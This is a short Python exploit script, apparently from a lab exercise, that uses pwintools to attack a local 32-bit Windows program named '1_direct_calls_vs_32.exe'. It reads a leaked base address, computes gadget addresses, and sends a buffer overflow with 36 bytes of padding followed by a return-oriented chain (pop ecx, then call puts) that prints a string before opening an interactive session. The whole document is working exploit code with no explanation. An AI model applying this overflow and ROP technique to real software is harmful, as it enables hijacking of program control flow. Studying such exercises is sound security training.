
from pwintools import *

retAddrOffs = 36

p = Process('1_direct_calls_vs_32.exe', CREATE_SUSPENDED)

p.set_timeout(3600000)

p.recvuntil(b'ss is ')
input = p.recvuntil(b'\r\n')

base = int(input[:8], 16)

print('base is ', hex(base))

POP_ECX = base + 0x000145b0
PUTS_ECX = base + 0x000143C6 # pop ecx; call puts
DUMMY_STRING = base + 0x0006F761

p.recvuntil(b'ciao\r\n')
p.sendline(
	b'a' * retAddrOffs
	+ p32(POP_ECX)
	+ p32(DUMMY_STRING)
	+ p32(PUTS_ECX)
)

p.interactive()

